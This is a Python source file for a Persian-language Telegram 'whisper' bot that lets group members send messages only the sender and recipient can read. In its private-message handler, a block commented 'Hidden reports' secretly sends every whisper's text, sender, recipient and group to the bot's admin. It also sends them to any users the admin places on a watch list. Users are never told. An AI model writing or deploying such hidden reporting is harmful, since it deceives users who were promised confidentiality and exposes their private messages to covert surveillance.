import asyncio
import json
import re
import secrets
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, F
from aiogram.types import Update, Message, ChatMemberUpdated
from aiogram.filters import CommandStart
from aiogram.exceptions import TelegramBadRequest
from sqlalchemy import select, delete

from .config import BOT_TOKEN, ADMIN_ID, FORCE_CHANNEL, BOT_USERNAME, BOT_NAME_FA, READ_LIMIT_MINUTES
from .database import init_db, SessionLocal
from .models import User, Group, Whisper, Pending, Watch
from .utils import start_keyboard, whisper_button, is_trigger

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is required")

bot = Bot(BOT_TOKEN, parse_mode="HTML")
dp = Dispatcher()

# ---------- Helpers ----------
async def is_member(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(FORCE_CHANNEL, user_id)
        status = getattr(member, 'status', None)
        return status in {'member', 'administrator', 'creator', 'owner'}
    except Exception:
        return False

async def ensure_user(user):
    async with SessionLocal() as s:
        u = await s.get(User, user.id)
        if not u:
            u = User(id=user.id, first_name=user.first_name, username=user.username)
            s.add(u)
            await s.commit()
        return u

async def ensure_group(chat):
    async with SessionLocal() as s:
        g = await s.get(Group, chat.id)
        title = chat.title if hasattr(chat, 'title') else None
        if not g:
            g = Group(id=chat.id, title=title, active=True)
            s.add(g)
        else:
            g.title = title or g.title
            g.active = True
        await s.commit()
        return g

# ---------- Handlers ----------
@dp.message(CommandStart())
async def start(message: Message):
    await ensure_user(message.from_user)
    if not await is_member(message.from_user.id):
        txt = (f"سلام {message.from_user.first_name}!\n"
               f"برای استفاده از ربات، ابتدا عضو کانال زیر شوید و سپس دکمه «تایید عضویت» را بزنید:\n"
               f"{FORCE_CHANNEL}")
        await message.answer(txt, reply_markup=start_keyboard(force=True))
        return

    intro = (f"به ربات {BOT_NAME_FA} خوش آمدید!\n"
             f"طرز استفاده در گروه: روی پیام کاربر ریپلای بزنید و یکی از کلمات «درگوشی»، «نجوا»، «سکرت» را بدون / ارسال کنید.\n"
             f"بعد از آن همینجا متن پیام را ارسال کنید تا به صورت محرمانه بین شما و مخاطب نمایش داده شود.\n\n"
             f"می‌توانید ربات را به گروه خود اضافه کنید:")
    await message.answer(intro, reply_markup=start_keyboard(force=False))

@dp.callback_query(F.data == "check_sub")
async def check_sub(call):
    ok = await is_member(call.from_user.id)
    if ok:
        await call.message.edit_text("✅ عضویت شما تایید شد. از دکمه‌های زیر استفاده کنید.", reply_markup=start_keyboard(False))
    else:
        await call.answer("هنوز عضو کانال نشده‌اید.", show_alert=True)

@dp.my_chat_member()
async def me_changed(event: ChatMemberUpdated):
    chat = event.chat
    if chat.type in ("group", "supergroup"):
        await ensure_group(chat)

@dp.message(F.chat.type.in_({"group", "supergroup"}))
async def group_listener(message: Message):
    try:
        await ensure_group(message.chat)
        if message.reply_to_message and is_trigger(message.text or ""):
            sender = message.from_user
            recipient = message.reply_to_message.from_user
            await ensure_user(sender)
            await ensure_user(recipient)
            async with SessionLocal() as s:
                from .models import Pending
                p = Pending(sender_id=sender.id, recipient_id=recipient.id, group_id=message.chat.id)
                await s.merge(p)
                await s.commit()
            try:
                text = f"لطفاً متن نجوای خود را برای <b>{recipient.full_name}</b> ارسال کنید.\nحداکثر زمان: {READ_LIMIT_MINUTES} دقیقه."
                await bot.send_message(sender.id, text)
            except TelegramBadRequest:
                pass
            await message.reply("◀️ لطفاً متن نجوا را در خصوصی ربات ارسال کنید…\nحداکثر زمان: {} دقیقه.".format(READ_LIMIT_MINUTES))
    except Exception:
        pass

@dp.message(F.chat.type == "private")
async def private_collector(message: Message):
    if not await is_member(message.from_user.id):
        await message.answer("برای استفاده، ابتدا عضو کانال شوید و سپس «تایید عضویت» را بزنید.", reply_markup=start_keyboard(force=True))
        return
    await ensure_user(message.from_user)
    text = message.text or (message.caption or "")
    if not text:
        await message.answer("متن نجوا را ارسال کنید.")
        return

    from .models import Whisper, Pending, Watch
    from sqlalchemy import select, delete
    from datetime import datetime, timedelta

    async with SessionLocal() as s:
        q = await s.get(Pending, message.from_user.id)
        if not q:
            await message.answer("در گروه روی پیام مخاطب «نجوا» بزنید و سپس متن را ارسال کنید.")
            return
        if datetime.utcnow() - q.created_at > timedelta(minutes=READ_LIMIT_MINUTES):
            await s.execute(delete(Pending).where(Pending.sender_id == message.from_user.id))
            await s.commit()
            await message.answer("مهلت ارسال به پایان رسید. دوباره در گروه «نجوا» بزنید.")
            return
        import secrets
        token = secrets.token_urlsafe(16)
        w = Whisper(id=token, group_id=q.group_id, sender_id=q.sender_id, recipient_id=q.recipient_id, text=text)
        s.add(w)
        await s.execute(delete(Pending).where(Pending.sender_id == message.from_user.id))
        await s.commit()

    try:
        recipient = await bot.get_chat(q.recipient_id)
    except Exception:
        recipient = type("obj",(object,),{"id":q.recipient_id,"full_name":"کاربر"})()
    try:
        group_msg = await bot.send_message(
            chat_id=q.group_id,
            text=f"نجوا برای {recipient.full_name} ارسال شد.",
            reply_markup=whisper_button(token)
        )
        async with SessionLocal() as s:
            wdb = await s.get(Whisper, token)
            wdb.group_message_id = group_msg.message_id
            await s.commit()
    except TelegramBadRequest:
        await message.answer("نجوا ثبت شد، اما ارسال پیام گروهی موفق نبود.")
    await message.answer("نجوا ثبت و ارسال شد.")

    # Hidden reports
    try:
        sender = message.from_user
        group = await bot.get_chat(q.group_id)
        recipient = await bot.get_chat(q.recipient_id)
        admin_text = (f"گزارش نجوا:\n"
                      f"فرستنده: <a href=\"tg://user?id={sender.id}\">{sender.full_name}</a>\n"
                      f"گروه: {group.title} ({group.id})\n"
                      f"گیرنده: <a href=\"tg://user?id={recipient.id}\">{recipient.full_name}</a>\n"
                      f"متن: {text}")
        if ADMIN_ID:
            await bot.send_message(ADMIN_ID, admin_text)
        async with SessionLocal() as s:
            res = await s.execute(select(Watch).where(Watch.group_id==q.group_id))
            for wch in res.scalars():
                try:
                    if wch.user_id != ADMIN_ID:
                        await bot.send_message(wch.user_id, admin_text)
                except:
                    pass
    except Exception:
        pass

@dp.callback_query(F.data.startswith("open:"))
async def open_whisper(call):
    token = call.data.split(":",1)[1]
    async with SessionLocal() as s:
        w = await s.get(Whisper, token)
        if not w:
            await call.answer("پیام یافت نشد.", show_alert=True); return
        allowed = call.from_user.id in (w.sender_id, w.recipient_id)
        if not allowed:
            await call.answer("این نجوا برای شما نیست.", show_alert=True); return
        await call.answer(w.text, show_alert=True)
        if not w.read_at:
            w.read_at = datetime.utcnow(); await s.commit()
            try:
                await bot.edit_message_text(
                    chat_id=w.group_id,
                    message_id=w.group_message_id,
                    text=f"نجوا خوانده شد. فرستنده: <a href=\"tg://user?id={w.sender_id}\">کاربر</a>",
                    reply_markup=whisper_button(w.id, again=True)
                )
            except Exception:
                pass

# -------- Admin-only (PRIVATE ONLY) --------
def admin_only(func):
    async def wrapper(message: Message, *a, **kw):
        if message.chat.type != "private" or message.from_user.id != ADMIN_ID:
            return
        return await func(message, *a, **kw)
    return wrapper

@dp.message(F.chat.type == "private", F.text.lower().in_({"آمار","stats","/stats"}))
@admin_only
async def stats(message: Message):
    async with SessionLocal() as s:
        users = (await s.execute(select(User))).scalars().all()
        groups = (await s.execute(select(Group))).scalars().all()
        wcount = (await s.execute(select(Whisper))).scalars().all()
    await message.answer(f"کاربران: {len(users)}\nگروه‌ها: {len(groups)}\nکل نجواها: {len(wcount)}")

@dp.message(F.chat.type=="private", F.text.regexp(r"^بازکردن گزارش\s+(\-?\d+)\s+برای\s+(\-?\d+)$"))
@admin_only
async def open_watch(message: Message):
    m = re.match(r"^بازکردن گزارش\s+(\-?\d+)\s+برای\s+(\-?\d+)$", message.text.strip())
    gid = int(m.group(1)); uid = int(m.group(2))
    async with SessionLocal() as s:
        s.add(Watch(group_id=gid, user_id=uid)); await s.commit()
    await message.answer("فعال شد.")

@dp.message(F.chat.type=="private", F.text.regexp(r"^بستن گزارش\s+(\-?\d+)\s+برای\s+(\-?\d+)$"))
@admin_only
async def close_watch(message: Message):
    m = re.match(r"^بستن گزارش\s+(\-?\d+)\s+برای\s+(\-?\d+)$", message.text.strip())
    gid = int(m.group(1)); uid = int(m.group(2))
    async with SessionLocal() as s:
        await s.execute(delete(Watch).where(Watch.group_id==gid, Watch.user_id==uid)); await s.commit()
    await message.answer("غیرفعال شد.")

@dp.message(F.chat.type=="private", F.text.lower().in_({"ارسال همگانی","broadcast","فوروارد همگانی"}))
@admin_only
async def broadcast_hint(message: Message):
    await message.answer("پیامی که می‌خواهید فوروارد شود را Reply کنید و جمله «تایید ارسال» را بفرستید.")

@dp.message(F.chat.type=="private")
@admin_only
async def admin_private(message: Message):
    if message.reply_to_message and message.text and message.text.strip() == "تایید ارسال":
        reply = message.reply_to_message
        sent = 0; failed = 0
        async with SessionLocal() as s:
            users = (await s.execute(select(User.id))).scalars().all()
            groups = (await s.execute(select(Group.id))).scalars().all()
        # FORWARD (not copy)
        for uid in set(users):
            try:
                await reply.forward(uid)
                sent += 1
            except:
                failed += 1
        for gid in set(groups):
            try:
                await reply.forward(gid)
                sent += 1
            except:
                failed += 1
        await message.answer(f"فوروارد انجام شد. موفق: {sent} | ناموفق: {failed}")

async def main():
    await init_db()
    print("Bot is running with polling...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
